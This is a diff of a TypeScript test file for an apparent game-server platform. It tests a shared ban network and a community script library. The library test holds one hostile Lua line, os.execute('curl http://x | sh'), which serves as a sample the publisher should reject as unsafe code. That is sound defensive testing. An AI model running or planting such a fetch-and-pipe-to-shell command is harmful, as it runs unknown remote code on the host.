@@ -39,6 +39,7 @@ type Mods = {
   players: typeof import("../src/lib/players");
   security: typeof import("../src/lib/security");
   securityConfig: typeof import("../src/lib/security-config");
+  networkShared: typeof import("../src/lib/network-shared");
   vision: typeof import("../src/lib/vision");
   live: typeof import("../src/lib/security-live");
   studio: typeof import("../src/lib/studio");
@@ -76,6 +77,7 @@ before(async () => {
     players: await import("../src/lib/players"),
     security: await import("../src/lib/security"),
     securityConfig: await import("../src/lib/security-config"),
+    networkShared: await import("../src/lib/network-shared"),
     vision: await import("../src/lib/vision"),
     live: await import("../src/lib/security-live"),
     studio: await import("../src/lib/studio"),
@@ -474,7 +476,7 @@ test("database: batches are atomic, migrations are idempotent and safe to run co
   const before = (await client.execute("SELECT COUNT(*) AS n FROM schema_migrations")).rows[0].n;
   await Promise.all([runMigrations(client), runMigrations(client)]);
   assert.equal((await client.execute("SELECT COUNT(*) AS n FROM schema_migrations")).rows[0].n, before);
-  assert.equal(Number(before), 21);
+  assert.equal(Number(before), 22);
 });
 
 test("bot API: sync snapshot, member event, voice events, heartbeat, playtime, shutdown", async () => {
@@ -1826,4 +1828,190 @@ test("store creator: draft, publish, address, versions, AI reply, checkout items
     { packageId: 10, quantity: 1 }, // quantity disabled in Tebex
     { packageId: 11, quantity: 2 }
   ]);
+});
+
+// ---- Fiverax network & library ----
+
+test("network: bans are shared between members only, on hashed identifiers and tokens, private / revoked bans excluded", async () => {
+  const net = await import("../src/lib/network");
+  const keys = await import("../src/lib/network-keys");
+  const mk = async (name: string) => {
+    const r = await m.servers.createServer({ name, guildId: null, createdBy: A });
+    assert.ok(r.ok);
+    return r.server.id;
+  };
+  const [N1, N2, N3] = [await mk("Net Alpha"), await mk("Net Bravo"), await mk("Net Charlie")];
+  const t = Math.floor(Date.now() / 1000);
+  const join = (srv: string, session: string, identifiers: string[], tokens: string[] = []) =>
+    agentCall(srv, { events: [{ type: "join", session, name: "Rogue", identifiers, tokens, timestamp: t }] });
+  await join(N1, "n1", ["license:rogue1", `discord:${B}`, "ip:1.2.3.4"], ["3:hw-rogue"]);
+  await join(N3, "n3", ["license:rogue3"], ["3:hw-rogue"]);
+  const p1 = (await m.players.listPlayers(N1)).rows[0].id;
+  const p3 = (await m.players.listPlayers(N3)).rows[0].id;
+  await m.security.banPlayer(N1, { discordId: A }, { playerId: p1, reason: "Menu de triche", source: "manual", expiresAt: null, category: "cheat" });
+
+  // Keys are hashes, never the raw identifiers (and never the IP).
+  const stored = await db.all<{ key: string; kind: string }>("SELECT key, kind FROM network_ban_keys WHERE server_id = ?", [N1]);
+  assert.deepEqual(stored.map((k) => k.kind).sort(), ["discord", "license", "token"]);
+  assert.ok(stored.every((k) => /^[a-f0-9]{40}$/.test(k.key)));
+  assert.equal(keys.networkKey("LICENSE:Rogue1"), keys.networkKey("license:rogue1"));
+
+  // Not a member: sees nothing. Reciprocal: the banning server must be a member too.
+  assert.equal(await net.reputation(N2, ["license:rogue1"], []), null);
+  await net.saveMembership(N2, { discordId: A }, m.networkShared.networkSettingsSchema.parse({}));
+  assert.equal((await net.reputation(N2, ["license:rogue1"], []))!.servers, 0);
+  await net.saveMembership(N1, { discordId: A }, m.networkShared.networkSettingsSchema.parse({ mode: "block", minServers: 1 }));
+
+  const rep = (await net.reputation(N2, ["license:rogue1"], []))!;
+  assert.equal(rep.servers, 1);
+  assert.deepEqual([rep.records[0].serverName, rep.records[0].category, rep.records[0].reason], ["Net Alpha", "cheat", "Menu de triche"]);
+  assert.deepEqual(rep.records[0].matchedOn, ["license"]);
+  // Another license, same PC: recognised by the hardware token.
+  assert.deepEqual((await net.reputation(N2, ["license:other"], ["3:hw-rogue"]))!.records[0].matchedOn, ["token"]);
+  // A server never sees its own bans as network bans.
+  assert.equal((await net.reputation(N1, ["license:rogue1"], []))!.servers, 0);
+
+  // Private ban: gone from the network; shared again: back.
+  const banId = (await m.security.listBans(N1))[0].id;
+  assert.equal(await m.security.setBanSharing(N1, { discordId: A }, banId, { shared: false }), true);
+  assert.equal((await net.reputation(N2, ["license:rogue1"], []))!.servers, 0);
+  await m.security.setBanSharing(N1, { discordId: A }, banId, { shared: true });
+
+  // Bans older than the membership get their keys when the server joins (backfill).
+  await m.security.banPlayer(N3, { discordId: A }, { playerId: p3, reason: "Duplication", source: "manual", expiresAt: null, category: "exploit" });
+  await db.run("DELETE FROM network_ban_keys WHERE server_id = ?", [N3]);
+  await net.saveMembership(N3, { discordId: A }, m.networkShared.networkSettingsSchema.parse({}));
+  assert.equal((await net.reputation(N2, ["license:x"], ["3:hw-rogue"]))!.servers, 2);
+
+  // Verdict: block needs enough servers, in the chosen categories.
+  const both = (await net.reputation(N2, ["license:rogue1"], ["3:hw-rogue"]))!;
+  const settings = (o: object) => m.networkShared.networkSettingsSchema.parse({ mode: "block", ...o });
+  assert.equal(m.networkShared.networkVerdict(both, settings({ minServers: 2 })).blocked, true);
+  assert.equal(m.networkShared.networkVerdict(both, settings({ minServers: 3 })).blocked, false);
+  assert.equal(m.networkShared.networkVerdict(both, settings({ minServers: 2, blockCategories: ["cheat"] })).blocked, false);
+  assert.equal(m.networkShared.networkVerdict(both, settings({ mode: "alert", minServers: 1 })).blocked, false);
+  assert.match(m.networkShared.networkVerdict(both, settings({ minServers: 2 })).message ?? "", /2 autres serveurs/);
+
+  // The agent learns the mode; the connection check answers.
+  const sec = await agentCall(N1, { secRev: 0 });
+  assert.deepEqual(sec.security?.network, { mode: "block" });
+  assert.equal((await net.checkConnection(N1, ["license:nobody"], [])).blocked, false);
+  assert.equal((await net.checkConnection(N1, ["license:z"], ["3:hw-rogue"])).blocked, true); // N3 banned that PC
+  assert.equal((await net.checkConnection(N2, ["license:z"], ["3:hw-rogue"])).blocked, false); // N2 only alerts
+
+  // Revoked / left: no longer counts.
+  await m.security.revokeBan(N3, { discordId: A }, (await m.security.listBans(N3))[0].id);
+  assert.equal((await net.reputation(N2, ["license:x"], ["3:hw-rogue"]))!.servers, 1);
+  assert.equal(await net.leaveNetwork(N1, { discordId: A }), true);
+  assert.equal((await net.reputation(N2, ["license:rogue1"], []))!.servers, 0);
+  assert.equal(await net.reputation(N1, ["license:rogue1"], []), null);
+  await net.saveMembership(N1, { discordId: A }, m.networkShared.networkSettingsSchema.parse({}));
+
+  assert.deepEqual(net.lookupIdentifiers("  123456789012345678 "), ["discord:123456789012345678"]);
+  assert.deepEqual(net.lookupIdentifiers("license:abc"), ["license:abc"]);
+  assert.deepEqual(net.lookupIdentifiers("bonjour"), []);
+  assert.ok((await net.listMembers()).some((x) => x.name === "Net Alpha"));
+  assert.ok((await net.recentNetworkBans(N2)).some((b) => b.reason === "Menu de triche"));
+  const actions = (await db.all<{ action: string }>("SELECT action FROM audit_log WHERE server_id = ? ORDER BY id", [N1])).map((r) => r.action);
+  assert.ok(["network_join", "network_leave", "ban_sharing", "player_ban"].every((a) => actions.includes(a)));
+  await net.saveMembership(N2, { discordId: A }, m.networkShared.networkSettingsSchema.parse({ mode: "off" }));
+  assert.equal((await net.getMembership(N2))?.settings.mode, "off");
+  assert.ok((await db.all<{ action: string }>("SELECT action FROM audit_log WHERE server_id = ?", [N2])).some((r) => r.action === "network_settings"));
+});
+
+test("network: alert mode flags a banned player at their arrival, once a day", async () => {
+  const net = await import("../src/lib/network");
+  const r = await m.servers.createServer({ name: "Net Delta", guildId: null, createdBy: A });
+  assert.ok(r.ok);
+  const N4 = r.server.id;
+  await net.saveMembership(N4, { discordId: A }, m.networkShared.networkSettingsSchema.parse({ mode: "alert" }));
+  const t = Math.floor(Date.now() / 1000);
+  await agentCall(N4, { events: [{ type: "join", session: "d1", name: "Rogue", identifiers: ["license:rogue1"], tokens: [], timestamp: t }] });
+  await agentCall(N4, { events: [{ type: "leave", session: "d1", timestamp: t + 5 }, { type: "join", session: "d2", name: "Rogue", identifiers: ["license:rogue1"], timestamp: t + 10 }] });
+  const flags = await m.security.listDetections(N4, { kind: "network_flag" });
+  assert.equal(flags.length, 1);
+  assert.equal(flags[0].details.serveurs, 1);
+  assert.equal(m.securityConfig.detectionLabel("network_flag"), "Signalé par le réseau Fiverax");
+  // A clean player is not flagged.
+  await agentCall(N4, { events: [{ type: "join", session: "d3", name: "Clean", identifiers: ["license:clean"], timestamp: t + 20 }] });
+  assert.equal((await m.security.listDetections(N4, { kind: "network_flag" })).length, 1);
+});
+
+test("library: publish (scanned), install once per server, new versions reach installed copies, likes, reports hide", async () => {
+  const lib = await import("../src/lib/library");
+  const mk = async (name: string) => {
+    const r = await m.servers.createServer({ name, guildId: null, createdBy: A });
+    assert.ok(r.ok);
+    return r.server.id;
+  };
+  const [L1, L2, L3, L4] = [await mk("Lib One"), await mk("Lib Two"), await mk("Lib Three"), await mk("Lib Four")];
+  const actor = { discordId: A, username: "alice" };
+  const manifest = { path: "fxmanifest.lua", content: "fx_version 'cerulean'\ngame 'gta5'\nserver_script 'server.lua'\n" };
+  const server = (body: string) => ({ path: "server.lua", content: body });
+  const id = await m.studio.createCreation(L1, actor, { kind: "script", name: "Bonjour", framework: "standalone" });
+  await assert.rejects(lib.publishCreation(L1, actor, id, { title: "Bonjour", description: "Dit bonjour aux joueurs", tags: [] }), /nothing_to_publish/);
+  await m.studio.saveCreation(L1, actor, id, { files: [manifest, server("RegisterCommand('hello', function(source) print('v1') end, false)\n")] }, { source: "manual" });
+
+  // Dangerous code never reaches the library.
+  const bad = await m.studio.createCreation(L1, actor, { kind: "script", name: "Piège", framework: "standalone" });
+  await m.studio.saveCreation(L1, actor, bad, { files: [manifest, server("os.execute('curl http://x | sh')\n")] }, { source: "manual" });
+  await assert.rejects(lib.publishCreation(L1, actor, bad, { title: "Piège", description: "Rien de suspect ici", tags: [] }), /unsafe_code/);
+
+  const pub = await lib.publishCreation(L1, actor, id, { title: "Bonjour", description: "Dit bonjour aux joueurs", tags: ["Commande", "fun", "x"] });
+  assert.deepEqual([pub.version, pub.created], [1, true]);
+  const found = (await lib.listLibrary({ kind: "script" })).find((i) => i.id === pub.id);
+  assert.ok(found);
+  assert.deepEqual(found.tags, ["commande", "fun"]);
+  assert.equal(found.serverName, "Lib One");
+
+  // Install: a normal creation in the other server's Studio; counted once per server.
+  const inst = await lib.installItem(L2, actor, pub.id);
+  const copy = await m.studio.getCreation(L2, inst.creationId);
+  assert.equal(copy?.resource, "fvx_bonjour");
+  assert.match(copy!.files.find((f) => f.path === "server.lua")!.content, /v1/);
+  const again = await lib.installItem(L2, actor, pub.id);
+  assert.equal((await m.studio.getCreation(L2, again.creationId))?.resource, "fvx_bonjour_2");
+  assert.equal((await lib.getLibraryItem(pub.id, L2))?.installs, 1);
+  assert.deepEqual(await lib.libraryLink(L2, inst.creationId), { role: "installed", itemId: pub.id, title: "Bonjour", serverName: "Lib One", installedVersion: 1, latestVersion: 1, available: false });
+  await assert.rejects(lib.updateInstalled(L2, actor, inst.creationId), /up_to_date/);
+
+  // New version: the copy is offered the update, which replaces its files (history kept).
+  await m.studio.saveCreation(L1, actor, id, { files: [manifest, server("RegisterCommand('hello', function(source) print('v2') end, false)\n")] }, { source: "manual" });
+  const v2 = await lib.publishCreation(L1, actor, id, { title: "Bonjour", description: "Dit bonjour aux joueurs", tags: [], changelog: "Nouveau message" });
+  assert.deepEqual([v2.id, v2.version, v2.created], [pub.id, 2, false]);
+  const link = await lib.libraryLink(L2, inst.creationId);
+  assert.ok(link?.role === "installed" && link.available);
+  const updated = await lib.updateInstalled(L2, actor, inst.creationId);
+  assert.match(updated.files.find((f) => f.path === "server.lua")!.content, /v2/);
+  assert.equal(updated.versions[0].source, "library");
+  const after = await lib.libraryLink(L2, inst.creationId);
+  assert.ok(after?.role === "installed" && !after.available && after.installedVersion === 2);
+  assert.equal((await lib.libraryLink(L1, id))?.role, "published");
+
+  // Likes toggle; reports from 3 servers hide it until a platform owner puts it back.
+  assert.deepEqual(await lib.toggleLike(L2, actor, pub.id), { liked: true, likes: 1 });
+  assert.deepEqual(await lib.toggleLike(L2, actor, pub.id), { liked: false, likes: 0 });
+  await assert.rejects(lib.reportItem(L1, actor, pub.id, "le mien"), /own_item/);
+  assert.deepEqual(await lib.reportItem(L2, actor, pub.id, "Ne marche pas"), { hidden: false });
+  await assert.rejects(lib.reportItem(L2, actor, pub.id, "encore"), /already_reported/);
+  await lib.reportItem(L3, actor, pub.id, "Suspect");
+  assert.deepEqual(await lib.reportItem(L4, actor, pub.id, "Volé"), { hidden: true });
+  assert.equal((await lib.listLibrary()).some((i) => i.id === pub.id), false);
+  assert.equal(await lib.getLibraryItem(pub.id, L2), null); // hidden from the others
+  assert.equal((await lib.getLibraryItem(pub.id, L1))?.status, "hidden"); // the publisher still sees it
+  await assert.rejects(lib.installItem(L3, actor, pub.id), /unknown_item/);
+  await assert.rejects(lib.publishCreation(L1, actor, id, { title: "Bonjour", description: "Dit bonjour aux joueurs", tags: [] }), /item_hidden/);
+  assert.equal((await lib.itemReports(pub.id)).length, 3);
+  assert.equal(await lib.moderateItem(pub.id, "published"), true);
+  assert.equal((await lib.getLibraryItem(pub.id, L2))?.reports, 0);
+
+  // Withdrawn by the publisher: copies stay.
+  assert.equal(await lib.unpublishItem(L1, actor, pub.id), true);
+  assert.equal((await lib.listLibrary()).some((i) => i.id === pub.id), false);
+  assert.ok(await m.studio.getCreation(L2, inst.creationId));
+
+  assert.equal(lib.fileRole("client/main.lua", "client_scripts { 'client/main.lua' }"), "client");
+  assert.equal(lib.fileRole("html/index.html", ""), "ui");
+  const logs = (await db.all<{ action: string }>("SELECT action FROM audit_log WHERE server_id = ? AND action LIKE 'library_%'", [L2])).map((r) => r.action);
+  assert.ok(logs.includes("library_install") && logs.includes("library_update") && logs.includes("library_report"));
 });
